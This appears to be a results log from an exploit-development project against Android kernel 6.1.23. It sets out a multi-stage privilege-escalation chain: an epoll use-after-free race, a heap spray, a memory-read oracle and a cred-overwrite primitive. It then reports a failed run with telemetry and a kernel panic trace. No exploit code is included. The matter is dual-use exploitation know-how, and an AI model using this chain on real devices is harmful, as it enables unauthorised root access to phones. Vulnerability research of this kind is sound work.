# HYP-013 Results: Unassisted End-to-End E2E Exploit (PoC)

## Goal
Execute the unassisted end-to-end exploit chain (no GDB, race to uid 0) on Android GKI 6.1.23, utilizing the natural Stage-1 race (HYP-010), the dma-buf victim sandwich reclaim, the AAR task list walk, and the `swaps_poll` gated write primitive.

## Method
A single unassisted binary `test_hyp013_poc.c` was launched as `uid=2000`. The harness loops up to 150,000 iterations to trigger the `__ep_remove` fast-path bypass naturally using the timerfd widening technique.
1. **Natural Stage-1 Race**: `ep_race_target` closed concurrently with `timerfd` wakeups to create a survivor epitem in `ep_uaf_waiter`.
2. **Victim Sandwich**: `ep_uaf_target` was sandwiched between Batch A and Batch B `filp` allocations.
3. **Drain & Spray**: On survivor detection, Batch A, Batch B, and 4,000 background files were closed. After a 2.0s RCU wait, 8,192 dma-buf pages were sprayed.
4. **Gated Oracle**: `ep_show_fdinfo` was used to confirm the `"swapper/"` canary. On a miss, the harness cleans up and retries.
5. **E2E Success Condition**: On an oracle hit, the harness would walk `init_task.tasks`, find the cred struct for `uid=2000`, use `epoll_wait` to fire the `swaps_poll` arbitrary write, and verify `getuid() == 0`.

## Results
The harness successfully triggered the Stage-1 race (survivor detected) but failed the Stage-2 reclaim, resulting in an AAR oracle miss. During the subsequent cleanup or retry, the kernel panicked due to a NULL pointer dereference in `__ep_remove`.

**Telemetry Report:**
- **Attempts**: 5,669 iterations before first survivor hit.
- **Race Wins**: 1
- **Reclaim Hits**: 0 (AAR Oracle missed; read_ino != `"swapper/"`)
- **Fires**: 0 (Gated primitive successfully prevented blind firing)
- **Root Successes**: 0
- **Panics**: 1

### Verbatim Evidence
```text
[*] Completed 5000 / 150000 iterations...
[  165.013487][   T59] epoll_uaf: UAF DETECTED in __ep_remove! inner_ep=ffffff80045666c0 freed before hlist_del_rcu
[+] NATURAL RACE HIT! Iteration 5669. Executing victim sandwich drain...
[*] Slab drain complete: -1 -> -1 slabs.
[-] AAR Oracle Miss. Reclaim failed. Cleaning up for retry...
[  173.140301][   T56] Unable to handle kernel read from unreadable memory at virtual address 0000000000000000
[  173.140942][   T56] Mem abort info:
[  173.141204][   T56]   ESR = 0x0000000096000005
[  173.141525][   T56]   EC = 0x25: DABT (current EL), IL = 32 bits
[  173.141847][   T56]   SET = 0, FnV = 0
[  173.142082][   T56]   EA = 0, S1PTW = 0
[  173.142570][   T56]   FSC = 0x05: level 1 translation fault
[  173.142900][   T56] Data abort info:
[  173.143139][   T56]   ISV = 0, ISS = 0x00000005
[  173.143402][   T56]   CM = 0, WnR = 0
[  173.143713][   T56] user pgtable: 4k pages, 39-bit VAs, pgdp=0000000043f68000
[  173.144112][   T56] [0000000000000000] pgd=0000000000000000, p4d=0000000000000000, pud=0000000000000000
[  173.145028][   T56] Internal error: Oops: 0000000096000005 [#1] PREEMPT SMP
[  173.145753][   T56] Modules linked in:
[  173.146246][   T56] CPU: 1 PID: 56 Comm: harness Not tainted 6.1.23-android14-4-maybe-dirty #1
[  173.146787][   T56] Hardware name: linux,dummy-virt (DT)
[  173.147340][   T56] pstate: 80400005 (Nzcv daif +PAN -UAO -TCO -DIT -SSBS BTYPE=--)
[  173.147782][   T56] pc : __ep_remove+0xe8/0x3d8
[  173.148192][   T56] lr : __ep_remove+0xc8/0x3d8
[  173.148451][   T56] sp : ffffffc009cdbc90
...
[  173.152706][   T56] Call trace:
[  173.152930][   T56]  __ep_remove+0xe8/0x3d8
[  173.153279][   T56]  ep_clear_and_put+0xd0/0x1dc
[  173.153514][   T56]  ep_eventpoll_release+0x20/0x38
[  173.153742][   T56]  __fput+0xfc/0x2dc
[  173.153936][   T56]  ____fput+0x18/0x2c
[  173.154173][   T56]  task_work_run+0xd8/0x104
[  173.154416][   T56]  do_notify_resume+0x294/0x340
[  173.154635][   T56]  el0_svc+0x68/0xc4
[  173.154827][   T56]  el0t_64_sync_handler+0x8c/0xfc
[  173.155161][   T56]  el0t_64_sync+0x1a0/0x1a4
[  173.155743][   T56] Code: 9430e64e 1400008e f9406ab7 91014289 (f94002e8) 
[  173.156338][   T56] ---[ end trace 0000000000000000 ]---
[  173.156875][   T56] Kernel panic - not syncing: Oops: Fatal exception
```

## Conclusion
The unassisted Proof-of-Concept demonstrated that the natural Stage-1 race is achievable (1 hit in 5,669 iterations, ~165 seconds runtime) on an unmodified QEMU instance dropping privileges to `uid=2000`. However, the dma-buf spray failed to reclaim the freed victim `filp`, causing an AAR miss. The subsequent cleanup loop triggered a kernel panic in `__ep_remove` (NULL pointer dereference), highlighting the fragility of state recovery after a failed Stage-2 reclaim. The `swaps_poll` write primitive was correctly gated behind the AAR check, preventing execution of `epoll_wait` on unverified memory and successfully preventing an indirect-call panic.
